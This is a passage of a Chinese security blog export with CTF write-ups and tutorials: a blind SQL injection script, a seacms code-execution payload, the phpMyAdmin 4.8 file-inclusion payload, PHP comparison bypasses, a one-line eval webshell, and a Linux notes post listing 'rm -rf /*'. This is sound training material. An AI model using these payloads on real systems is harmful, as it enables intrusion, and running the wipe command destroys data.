chr(ord(str[i])+j) j = j+1 print flag 得到flag: flag{c4es4r_variation} 袁殊解题步骤：下载文件解压：得到两个文件 用kali linux的 openssl openssl rsa -pubin -text -modulus -in warmup -in RSA256/RSA256/gy.key 得到： Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- 可以看到Exponent: 65537，这里成为en的十六进制是Modules：A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9用python转成转成十进制： &gt;python Python 3.6.4 (v3.6.4:d48eceb, Dec 19 2017, 06:54:40) [MSC v.1900 64 bit (AMD64)] on win32 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; a=0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 &gt;&gt;&gt; a 76775333340223961139427050707840417811156978085146970312315886671546666259161 再将n进行因式分解来得到我p和q (使用http://factordb.com/) p=273821108020968288372911424519201044333 q=280385007186315115828483000867559983517 最后写好脚本，得出flag： #coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;./fllllllag.txt&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 flag{_2o!9_CTF_ECUN_}晴气庆胤打开页面得到： 查看页面源代码： 发现这中类行题 以前遇见过直接playload 这样就得到了flag 冈村宁次打开网址为：http://47.103.43.235:83/web/a/index.php?id===QM 感觉他传递的参数有一点像base64 发现是1 base64编码的逆序输出 所以测试一下：传递参数：if(1,1,2) 编码后为：pIDLxwSMoYWa 传递参数：if(0,1,2) 编码后为：pIDLxwCMoYWa fuzz一下 发现了 过滤了 空格 等号 其中 空格用 /*1*/ 绕过 等号用 like 绕过 于是编写脚本 import base64 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) def string_reverse(m): s = base64.b64encode(m) num=len(s) a=&quot;&quot; for i in range(num): a += s[num-1-i] return a url =&quot;http://47.103.43.235:83/web/a/index.php?id=&quot; flag =&quot;&quot; for i in range(1,40): for j in range(33,128): # playload = &quot;if((ascii(substr(database(),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/group_concat(table_name)/*a*/from/*a*/infoorrmation_schema.tables/*a*/ where/*a*/table_schema/*a*/like/*a*/ database()),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # playload = &quot;if((ascii(substr((selselectect/*a*/ group_concat(column_name)/*a*/ from /*a*/infoorrmation_schema.columns/*a*/ where/*a*/ table_name/*a*/like/*a*/&#39;flag&#39;),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; playload = &quot;if((ascii(substr((seleselectct/*a*/flag /*a*/from/*a*/ flag),&quot;+str(i)+&quot;,1))&gt;&quot;+str(j)+&quot;),1,2)&quot; # print playload # exit() playload = string_reverse(playload) # print playload r=requests.get(url+playload) # print url+playload # print r.text # exit() if &quot;2019-11-11&quot; in r.text: flag += str(chr(j)) print flag break 就能得到flag: flag{s9li_1s_s0_e4sY} 作战计划进入发现是 seacms 可能存在任意代码执行 原理详见：https://www.jianshu.com/p/a3a18f233184 故playload: http://47.103.43.235:84/search.php?searchtype=5&amp;tid=6&amp;year=2014);assert($_POST[&quot;raidsh&quot;]);// post传参：radish=system(&quot;cat $(find / -name flag*)&quot;) 就能得到flag 池步洲打开页面 查看页面源代码： 发现index.phps 页面 &lt;?php error_reporting(0); $flag = &#39;********&#39;; if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;]) print &#39;name and password must be diffirent&#39;; else if (sha1($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])) die($flag); else print &#39;invalid password&#39;; } ?&gt; 代发审计一波 发现可以绕过 post传参： name[]=a&amp;password[]=b 就可以得到flag: flag{Y0u_just_br0ke_sha1} obfuse32位ELF文件，无壳，载入IDA中通过关键字符串查找关键代码但是发现f5不好使，只能看汇编，首先输出“password：”，然后再从缓存区读取一串字符串，进入到sub_8048580进行验证，若返回0，则输入的是错误的，若返回1则输入的是正确的 在sub_8048580函数中是一位一位的check _BOOL4 __cdecl sub_8048580(int a1, signed int a2) { signed int v2; // edx char v3; // al _BOOL4 result; // eax char v5[33]; // [esp+Ch] [ebp-A0h] char b20_1; // [esp+2Dh] [ebp-7Fh] char b1f_1; // [esp+2Eh] [ebp-7Eh] char b1e_1; // [esp+30h] [ebp-7Ch] char b1d_1; // [esp+31h] [ebp-7Bh] char b1c_1; // [esp+32h] [ebp-7Ah] char b1b_1; // [esp+33h] [ebp-79h] char b1a_1; // [esp+35h] [ebp-77h] char b19_1; // [esp+36h] [ebp-76h] char b18_1; // [esp+37h] [ebp-75h] char b17_1; // [esp+38h] [ebp-74h] char b16_1; // [esp+39h] [ebp-73h] char b15_1; // [esp+3Ah] [ebp-72h] char b14_1; // [esp+3Ch] [ebp-70h] char b13_0; // [esp+3Dh] [ebp-6Fh] char b12_0; // [esp+3Eh] [ebp-6Eh] char b11_0; // [esp+3Fh] [ebp-6Dh] char b10_0; // [esp+40h] [ebp-6Ch] char bf_0; // [esp+41h] [ebp-6Bh] char be_0; // [esp+42h] [ebp-6Ah] char bd_0; // [esp+43h] [ebp-69h] char bc_1; // [esp+44h] [ebp-68h] char bb_1; // [esp+45h] [ebp-67h] char ba_1; // [esp+56h] [ebp-56h] char b9_0; // [esp+7Ch] [ebp-30h] char b8_0; // [esp+7Dh] [ebp-2Fh] char b7_0; // [esp+7Eh] [ebp-2Eh] char b6_0; // [esp+7Fh] [ebp-2Dh] char b5_1; // [esp+80h] [ebp-2Ch] char b4_1; // [esp+81h] [ebp-2Bh] char b3_1; // [esp+82h] [ebp-2Ah] char b2_1; // [esp+83h] [ebp-29h] char b1_1; // [esp+85h] [ebp-27h] unsigned int v38; // [esp+8Ch] [ebp-20h] v38 = __readgsdword(0x14u); v2 = a2; while ( 2 ) { memset(v5, 0, 0x80u); v3 = *(_BYTE *)(a1 + v2); v5[(v3 + 64) % 128] = 1; if ( (unsigned __int8)(v3 - 10) &lt;= 0x70u ) { switch ( v3 ) { case &#39;\\n&#39;: return v2 == 13 &amp;&amp; ba_1 != 0; case &#39;0&#39;: if ( v2 || !b9_0 ) return 0; v2 = 1; continue; case &#39;1&#39;: if ( v2 == 14 &amp;&amp; b8_0 ) goto LABEL_12; return 0; case &#39;2&#39;: if ( v2 == 20 &amp;&amp; b7_0 ) goto LABEL_15; return 0; case &#39;3&#39;: if ( v2 != 89 || !b6_0 ) return 0; v2 = 90; continue; case &#39;4&#39;: if ( v2 != 15 || !b5_1 ) return 0; v2 = 16; continue; case &#39;5&#39;: if ( v2 != 14 || !b4_1 ) return 0; LABEL_12: v2 = 15; continue; case &#39;6&#39;: if ( v2 != 12 || !b3_1 ) return 0; v2 = 13; continue; case &#39;7&#39;: if ( v2 != 5 || !b2_1 ) return 0; v2 = 6; continue; case &#39;8&#39;: result = 0; if ( b1_1 ) result = v2 == 33 || v2 == 2; return result; case &#39;9&#39;: if ( v2 != 1 || !b1_1 ) return 0; v2 = 2; continue; case &#39;a&#39;: if ( v2 != 35 || !b20_1 ) return 0; v2 = 36; continue; case &#39;b&#39;: if ( v2 != 11 || !b1f_1 ) return 0; v2 = 12; continue; case &#39;c&#39;: if ( v2 != 32 || !b20_1 ) return 0; v2 = 33; continue; case &#39;d&#39;: if ( v2 != 3 || !b1e_1 ) return 0; v2 = 4; continue; case &#39;e&#39;: if ( v2 != 7 || !b1d_1 ) return 0; v2 = 8; continue; case &#39;f&#39;: if ( !b1c_1 || v2 != 8 &amp;&amp; v2 != 4 ) return 0; goto LABEL_53; case &#39;g&#39;: return v2 == 12 &amp;&amp; b10_0 != 0; case &#39;h&#39;: if ( v2 != 13 || !b1b_1 ) return 0; v2 = 14; continue; case &#39;i&#39;: if ( v2 != 9 || !b1a_1 ) return 0; v2 = 10; continue; case &#39;j&#39;: if ( v2 != 10 || !b19_1 ) return 0; v2 = 11; continue; case &#39;k&#39;: return v2 == 12 &amp;&amp; b18_1 != 0; case &#39;l&#39;: if ( v2 != 19 || !b17_1 ) return 0; v2 = 20; continue; case &#39;m&#39;: if ( v2 != 17 || !b16_1 ) return 0; v2 = 18; continue; case &#39;n&#39;: return v2 == 18 &amp;&amp; b16_1 != 0; case &#39;o&#39;: if ( !b15_1 || v2 != 6 &amp;&amp; v2 != 28 ) return 0; LABEL_53: ++v2; continue; case &#39;p&#39;: if ( v2 != 30 || !b14_1 ) return 0; v2 = 31; continue; case &#39;q&#39;: if ( v2 != 29 || !b13_0 ) return 0; v2 = 30; continue; case &#39;r&#39;: if ( v2 != 20 || !b12_0 ) return 0; LABEL_15: v2 = 21; continue; case &#39;s&#39;: if ( v2 != 25 || !b11_0 ) return 0; v2 = 26; continue; case &#39;t&#39;: return v2 == 24 &amp;&amp; b12_0 != 0; case &#39;u&#39;: if ( v2 != 26 || !bf_0 ) return 0; v2 = 27; continue; case &#39;v&#39;: if ( v2 != 2 || !be_0 ) return 0; v2 = 3; continue; case &#39;w&#39;: if ( v2 != 6 || !bd_0 ) return 0; v2 = 7; continue; case &#39;x&#39;: if ( v2 != 22 || !bc_1 ) return 0; v2 = 23; continue; case &#39;y&#39;: if ( v2 != 23 || !bb_1 ) return 0; v2 = 24; continue; case &#39;z&#39;: return v2 == 21 &amp;&amp; b20_1 != 0; default: return 0; } } return 0; } } 根据switch中case的值和case中的if条件就可以反推出来正确的flag flag：09vdf7wefijbkAuth.exe32位的windows上可执行文件，无壳，先运行一下程序： 同样也是载入IDA中通过关键字符串查找关键代码（main函数），本函数前面定义了一大堆数据，最后经过sub_401500处理 int __cdecl main(int argc, const char **argv, const char **envp) { const CHAR *v3; // ebx HMODULE v4; // eax void (__stdcall *v5)(HMODULE, LPCSTR); // eax char v7; // [esp+1h] [ebp-157h] char v8[4]; // [esp+15h] [ebp-143h] int v9; // [esp+20h] [ebp-138h] int v10; // [esp+26h] [ebp-132h] int v11; // [esp+2Ah] [ebp-12Eh] int v12; // [esp+2Eh] [ebp-12Ah] int v13; // [esp+32h] [ebp-126h] int v14; // [esp+36h] [ebp-122h] int v15; // [esp+3Ah] [ebp-11Eh] __int16 v16; // [esp+3Eh] [ebp-11Ah] int v17; // [esp+40h] [ebp-118h] int v18; // [esp+44h] [ebp-114h] int v19; // [esp+48h] [ebp-110h] int v20; // [esp+4Ch] [ebp-10Ch] int v21; // [esp+50h] [ebp-108h] int v22; // [esp+54h] [ebp-104h] int v23; // [esp+58h] [ebp-100h] int v24; // [esp+5Ch] [ebp-FCh] int v25; // [esp+60h] [ebp-F8h] int v26; // [esp+64h] [ebp-F4h] int v27; // [esp+68h] [ebp-F0h] int v28; // [esp+6Ch] [ebp-ECh] int v29; // [esp+70h] [ebp-E8h] char v30; // [esp+74h] [ebp-E4h] int a_2; // [esp+75h] [ebp-E3h] int v32; // [esp+79h] [ebp-DFh] int v33; // [esp+7Dh] [ebp-DBh] int v34; // [esp+81h] [ebp-D7h] int v35; // [esp+85h] [ebp-D3h] int v36; // [esp+89h] [ebp-CFh] int v37; // [esp+8Dh] [ebp-CBh] int v38; // [esp+91h] [ebp-C7h] __int16 v39; // [esp+95h] [ebp-C3h] int a_1; // [esp+97h] [ebp-C1h] int v41; // [esp+9Bh] [ebp-BDh] int v42; // [esp+9Fh] [ebp-B9h] int v43; // [esp+A3h] [ebp-B5h] int v44; // [esp+A7h] [ebp-B1h] int v45; // [esp+ABh] [ebp-ADh] int v46; // [esp+AFh] [ebp-A9h] int v47; // [esp+B3h] [ebp-A5h] char v48; // [esp+B7h] [ebp-A1h] int v49; // [esp+B8h] [ebp-A0h] int v50; // [esp+BEh] [ebp-9Ah] int v51; // [esp+C2h] [ebp-96h] int v52; // [esp+C6h] [ebp-92h] int v53; // [esp+CAh] [ebp-8Eh] int v54; // [esp+CEh] [ebp-8Ah] int v55; // [esp+D2h] [ebp-86h] int v56; // [esp+D6h] [ebp-82h] int v57; // [esp+DAh] [ebp-7Eh] char v58; // [esp+DEh] [ebp-7Ah] int v59; // [esp+DFh] [ebp-79h] int v60; // [esp+E3h] [ebp-75h] int v61; // [esp+E7h] [ebp-71h] int v62; // [esp+EBh] [ebp-6Dh] int v63; // [esp+EFh] [ebp-69h] int v64; // [esp+F3h] [ebp-65h] int v65; // [esp+F7h] [ebp-61h] int v66; // [esp+FBh] [ebp-5Dh] __int16 v67; // [esp+FFh] [ebp-59h] int v68; // [esp+101h] [ebp-57h] int v69; // [esp+105h] [ebp-53h] char v70; // [esp+109h] [ebp-4Fh] int v71; // [esp+10Ah] [ebp-4Eh] int v72; // [esp+10Eh] [ebp-4Ah] int v73; // [esp+112h] [ebp-46h] int v74; // [esp+116h] [ebp-42h] int v75; // [esp+11Ah] [ebp-3Eh] int v76; // [esp+11Eh] [ebp-3Ah] int v77; // [esp+122h] [ebp-36h] int v78; // [esp+126h] [ebp-32h] int v79; // [esp+12Ah] [ebp-2Eh] int v80; // [esp+12Eh] [ebp-2Ah] int v81; // [esp+132h] [ebp-26h] int v82; // [esp+136h] [ebp-22h] int v83; // [esp+13Ah] [ebp-1Eh] int v84; // [esp+13Eh] [ebp-1Ah] int v85; // [esp+142h] [ebp-16h] int v86; // [esp+146h] [ebp-12h] int v87; // [esp+14Ah] [ebp-Eh] __int16 v88; // [esp+14Eh] [ebp-Ah] int *v89; // [esp+150h] [ebp-8h] v89 = &amp;argc; sub_402940(); puts( &quot; . \\n&quot; &quot; _|_ ROBOTIC AUTHENTICATION SYSTEM\\n&quot; &quot; /\\\\/\\\\ (. .) /\\n&quot; &quot; `||&#39; |#| \\n&quot; &quot; ||__.-\\&quot;-\\&quot;-.___ \\n&quot; &quot; `---| . . |--.\\\\ \\n&quot; &quot; | : : | ,||,\\n&quot; &quot; `..-..&#39; \\\\/\\\\/\\n&quot; &quot; || || \\n&quot; &quot; || || \\n&quot; &quot; |__|__| \\n&quot;); v49 = 0x539; v50 = 0x60646D51; v51 = 0x64216472; v52 = 0x7364756F; v53 = 0x64697521; v54 = 0x73686721; v55 = 0x51217572; v56 = 0x76727260; v57 = 0x3B65736E; v58 = 1; a_1 = 0x60646D51; v41 = 0x64216472; v42 = 0x7364756F; v43 = 0x64697521; v44 = 0x73686721; v45 = 0x51217572; v46 = 0x76727260; v47 = 0x3B65736E; v48 = 1; v59 = 0x60646D51; v60 = 0x64216472; v61 = 0x7364756F; v62 = 0x64697521; v63 = 0x62647221; v64 = 0x21656F6E; v65 = 0x72726051; v66 = 0x65736E76; v67 = 315; a_2 = 0x60646D51; // Please enter the second Password v32 = 0x64216472; v33 = 0x7364756F; v34 = 0x64697521; v35 = 0x62647221; v36 = 0x21656F6E; v37 = 0x72726051; v38 = 0x65736E76; v39 = 315; v68 = 0x6F6F3074; v69 = 0x666D3367; v70 = 3; v28 = 0x6F6F3074; v29 = 0x666D3367; v30 = 3; v71 = 0x6F73646A; v72 = 0x33326D64; v73 = 0x6D6D652F; v74 = 0x13F0101; v24 = 0x6F73646A; v25 = 0x33326D64; v26 = 0x6D6D652F; v27 = 0x13F0101; v75 = 0x57656540; v76 = 0x6E756264; v77 = 0x44656473; v78 = 0x71646279; v79 = 0x6F6E6875; v80 = 0x656F6049; v81 = 0x173646D; v17 = 0x57656540; v18 = 0x6E756264; v19 = 0x44656473; v20 = 0x71646279; v21 = 0x6F6E6875; v22 = 0x656F6049; v23 = 0x173646D; v82 = 0x21746E58; v83 = 0x2F6F6876; v84 = 0x6F6E4221; v85 = 0x75607366; v86 = 0x75606D74; v87 = 0x726F6E68; v88 = 0x120; v10 = 0x21746E58; v11 = 0x2F6F6876; v12 = 0x6F6E4221; v13 = 0x75607366; v14 = 0x75606D74; v15 = 0x726F6E68; v16 = 0x120; v9 = 0x539; strcpy(v8, &quot;r0b0RUlez!&quot;); dword_40AD94 = (int)&amp;v9; dword_40ADA0 = (int)&amp;v49; dword_40AD8C = (char *)&amp;a_1; dword_40AD90 = (char *)&amp;a_2; dword_40AD98 = (int)&amp;v28; lpProcName = (LPCSTR)&amp;v17; lpModuleName = (LPCSTR)&amp;v24; dword_40ADA4 = (char *)&amp;v10; sub_401500(0); v3 = lpProcName; v4 = GetModuleHandleA(lpModuleName); v5 = (void (__stdcall *)(HMODULE, LPCSTR))GetProcAddress(v4, v3); v5((HMODULE)1, (LPCSTR)sub_40157F); puts(dword_40AD8C); scanf(&quot;%20s&quot;, &amp;v7); if ( !strcmp(&amp;v7, v8) ) { puts(&quot;You passed level1!&quot;); sub_4015EA(0); } return 0; } 在sub_401500函数中对刚刚定义的数据的每一位都和1异或先把数据解密一下： data1=&quot;516D6460726421646F756473217569642167687372752151607272766E73653B&quot; str1 =&quot;&quot; for x in range(0,len(data1),2): str1 += chr(eval(&quot;0x&quot;+data1[x:x+2])^1) print str1 data2 = &quot;516D6460726421646F75647321756964217264626E6F652151607272766E73653B&quot; str2 =&quot;&quot; for x in range(0,len(data2),2): str2 += chr(eval(&quot;0x&quot;+data2[x:x+2])^1) print str2 data3 = &quot;74306F6F67336D66&quot; str3 =&quot;&quot; for x in range(0,len(data3),2): str3 += chr(eval(&quot;0x&quot;+data3[x:x+2])^1) print str3 data4 = &quot;6A64736F646D32332F656D6D&quot; str4 = &quot;&quot; for x in range(0,len(data4),2): str4 += chr(eval(&quot;0x&quot;+data4[x:x+2])^1) print str4 data5 = &quot;406565576462756E736465447962647175686E6F49606F656D6473&quot; str5 = &quot;&quot; for x in range(0,len(data5),2): str5 += chr(eval(&quot;0x&quot;+data5[x:x+2])^1) print str5 data6 = &quot;586E742176686F2F21426E6F66736075746D6075686E6F7220&quot; str6 = &quot;&quot; for x in range(0,len(data6),2): str6 += chr(eval(&quot;0x&quot;+data6[x:x+2])^1) print str6 输出结果：发现是一些需要输出的字符串 接下来程序接收一个字符串，与字符串“r0b0RUlez!”进行比较，这是第一层限制，然后来到函数sub_4015EA，在这个里面构造了一个异常，当程序走到这里的时候，发生异常而进行跳转，在跳转之前改变了一个数据，第二跳是在这个函数中的，那么我们就跟进第一条 跟进之后来到一个函数中，再接收一个字符串，进入sub_401547进行比较 在sub_401547函数中对字符串“u1nnf2lg”每一位都与2异或 解密得到“w3lld0ne” flag = &quot;u1nnf2lg&quot; real_flag =&quot;&quot; for x in range(len(flag)): real_flag+=chr(ord(flag[x])^2) print real_flag 最后将字符串拼接起来 flag：r0b0RUlez!_w3lld0ne","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"CTF中常见的web","slug":"CTF中常见的web","date":"2019-03-10T07:18:34.261Z","updated":"2019-05-29T12:32:33.470Z","comments":true,"path":"2019/03/10/CTF中常见的web/","link":"","permalink":"http://yoursite.com/2019/03/10/CTF中常见的web/","excerpt":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码","text":"CTF常见的web题网页注释有些题会在网页注释给出提示信息，比如给出一部分源码 表单标签的属性比如修改input标签的maxlenth属性来得到flag 伪造IPX-Forwarded-For:127.0.0.1 body标签之外有时候题目作者会把提示放在body标签和html标签之间，这样提示不会出现在网页页面，需要查看网页源码才能看到。 数据包信息隐藏在数据包的请求头和响应头里，通过抓包来获取 robots.txt一般网站会有robots.txt来规范爬虫的行为，利用robots.txt有可能获取到网站重要文件所在的位置 备份文件（还没见过）某些编译器会在编译时生成一些备份文件，如果不写正确处理这些文件，黑客可以利用这些文件来还原源码如： 网站备份压缩 .rar .zip .7z .tar.gz .bak PHP代码审计(常见漏洞)is_numeric(mixed $var)这是检测变量是否为数字或者数字字符串 有时候会需要绕过该函数的判断，课以利用科学计数法 如 1 == 1E+0 strip_tags(string allow)的逻辑错误这是一个剥去字符串中html、xml以及php的标签的函数。 allow可选。规定允许的标签，这些标签会不会被删除 有些代码会将该函数放在过滤代码之后，那么可以通过在payload中嵌入HTML、XML 以及PHP标签的方式绕过之前的过滤代码。 urldecode()逻辑漏洞同strip_tags(),将该函数放在判断函数之后的话可通过对payload的二次url编码绕过之前的判断函数。 本地包含 eval()函数把字符串按照PHP代码执行 var_dump()打印变量的相关信息 show_source() 函数对文件进行语法高亮显示 如果以上变量函数可控且未经处理，可执行恶意代码 $GLOBALS$GLOBALS：是一个数组，包含了全局作用域中可用的全部变量。变量的名字就是数组的键。合理利用$GLOBALS全局变量也许可以获得可利用变量信息。常与var_dump()函数连用。 php://伪协议php://filter伪协议php://filter 的参数列表 read 读取 write 写入 resource 数据来源(必须的) read参数值可以为 string.stip_tags 将数据流中的HTML标签清除 string.toupper 将数据流中的内容转换为大写 string.tolower 将数据流中的内容转换为小写 convert.base64-encode 将数据流中的内容转换为base64编码 convertr.base64-decode 与上面对应的解码 利用这个函数漏洞需和文件包含漏洞一起使用，可以读取网页的PHP源代码 index.php?file=php://filter/read=convert.base64-encode/resource=index.php php://input 一句话木马php://input 用来接收post数据的 可以接收一句话木马&lt;?php eval($_POST[‘a’]); ?&gt;","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PHP的黑魔法","slug":"PHP的黑魔法","date":"2019-03-10T07:18:34.261Z","updated":"2019-05-29T12:33:02.793Z","comments":true,"path":"2019/03/10/PHP的黑魔法/","link":"","permalink":"http://yoursite.com/2019/03/10/PHP的黑魔法/","excerpt":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123","text":"弱比较若字符串以数字开头，则取开头数字作为转换结果，若无则输出0 &#39;123abc&#39; == 123 md5(),sha1()md5()是不能处理数组的 md5(数组)会返回null，两个null相等绕过 md5([1]) == md5([2]) sha1()函数也是这样 md5($pass,true)可以让pass=ffifdyop 绕过 intval()intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。 即使出现无法转换的字符串也不会报错的，会直接返回0 var_dump((int)(&#39;1e-1000&#39;)&gt;0); // 1&gt;0 echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-1000&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(false) var_dump((int)(&#39;1e-10&#39;)&gt;0); echo &quot;&lt;br&gt;&quot;; var_dump(&#39;1e-10&#39;&gt;0); echo &quot;&lt;br&gt;&quot;; 输出结果为： bool(true) bool(true) strcmp()函数strcnp()函数只有在相等的情况下才会返回0 若果我们传入一个数组，他会返回NULL,而判断使用的是\\==而NULL==0是bool(true)，这样就成功绕过。 $a=[]; if(strcmp($a,&quot;haha&quot;)) { echo 1; }else{ echo 2; } 输出的结果 2 说明可以绕过strcmp()函数 ereg()函数字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 is_numeric()函数 当有两个is_numeric判断并用and后面的is_numeric可以绕过 $a = []; $b = aaa; if(is_numeric($b) == is_numeric($a)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明第二个变量我们可以任意输入，可以绕过 16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤 $a = 8; $b = 0x8; if(is_numeric($a) == is_numeric($b)) { echo 1; }else{ echo 2; } echo &quot;&lt;br&gt;&quot;; 输出结果 1 说明可以绕过16进制也可以绕过 switch()函数当switch没有break时可以继续往下执行。这里也有自动转换，比如$switch_bug = a,会当0执行，$switch_bug =1a，会当1执行…… array_search()函数用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。 当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功 $array_search=[&#39;haha&#39;,&#39;hehe&#39;,0]; $eee = @array_search(&quot;XMAN&quot;, $array_search); if($eee){ echo &quot;array_search()检索字符串绕过成功&quot;; }else{ echo &quot;array_search()检索字符串绕过失败&quot;; } 输出结果： array_search()检索字符串绕过成功","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"linux 日志分析","slug":"linux-日志分析","date":"2019-01-09T08:19:07.000Z","updated":"2019-05-29T12:32:25.686Z","comments":true,"path":"2019/01/09/linux-日志分析/","link":"","permalink":"http://yoursite.com/2019/01/09/linux-日志分析/","excerpt":"","text":"linux 日志分析Linux 基础命令一些常用的linux命令 cd 切换目录 cd / 回到根目录 ls 查看当前文件夹下的内容 ls -a 显示所有文件，包括隐藏文件 ls -l 显示文件的详细信息 cat 查看文件内容 pwd 显示当前工作路径 cp filename newfilename 复制文件，可以加上路径 mv filename filename 剪切文件，第一个是原文件路径，第二个是目标文件的路径，如果不加路径，相当于重命名 mkdir name 新建文件夹 vi/vim filename 编辑或者是新建一个文件 name -r 显示linux内核版本 cat /proc/version 查看当前操作系统版本信息 cat /etc/lsb-release 查看具体发行版本信息等等 cat /etc/issue lsb_release whoami 查看当前用户身份 id 查看当前用户分组 rm -rf filename 删除命令 rm -rf /* 自毁命令 日志文件一些重要的日志文件 history 查看最近执行的命令 etc/httpd/access_log web的系统日志 etc/httpd/ 这个文件下都是web的日志 var/log/ 这个文件下面都是linux系统的日志 var/log/wtmp 记录每个用户的登录次数和持续的时间等信息 var/log/btmp 记录登陆失败的信息 var/log/utmp 用户登陆信息 var/log/secure Linux系统安全日志，记录用户和工作组变坏情况、用户登陆认证情况 var/log/messages 记录Linux操作系统常见的系统和服务错误信息 /var/log/maillog 该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统 /var/log/xferlog 该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用 last 列出当前以及曾经登入系统的用户信息，其实读取的还是wtmp文件 lastlog 列出所有用户最近登录的信息(登录时间，登陆ip等)，或者指定用户的最近登录信息 lastb 列出失败尝试的登陆信息 w 查看当前登入系统的用户信息及用户当前的进程 tail -f -n -d xxx_log 如果日志还在更新，可以用该条命令实时查看,-d表示不同地方，-n多少秒刷新一次 感觉比较重要的常用的日志文件就这么多吧。其他的遇见了再总结！","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"HCTF 2018 wp","slug":"HCTF-2018-wp","date":"2019-01-08T15:50:09.000Z","updated":"2019-05-29T12:33:37.538Z","comments":true,"path":"2019/01/08/HCTF-2018-wp/","link":"","permalink":"http://yoursite.com/2019/01/08/HCTF-2018-wp/","excerpt":"HCTF2018","text":"HCTF2018 web 签到题 warmup点击之后发现是个文件包含类型的 url:http://warmup.2018.hctf.io/index.php?file=hint.php source.php的源码也有 &lt;?php class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&#39;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; } } if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) { include $_REQUEST[&#39;file&#39;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 可以看到对我们传入的参数一定的要求 if (!empty($_REQUEST[&#39;file&#39;]) &amp;&amp;is_string($_REQUEST[&#39;file&#39;]) &amp;&amp;emmm::checkFile($_REQUEST[&#39;file&#39;]) ) 发现只有source.php hint.php 才能绕过截取 $whitelist=[&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 截取函数 截取你传入参数?前的内容 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) 判断截取的内容是否在数组whitelist里面 if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; 所以要利用?截取处hint.php或者source.php，利用hint。php成为一个不存在的目录，最后include利用../../跳出目录来读取flag payload: index.php?file=source.php?/../../../../ffffllllaaaagggg index.php?file=hint.php?/../../../../ffffllllaaaagggg ps 直接把source的源码复制搜索就可以找到这个漏洞 受影响版本: phpMyAdmin4.8.0 phpMyAdmin4.8.1 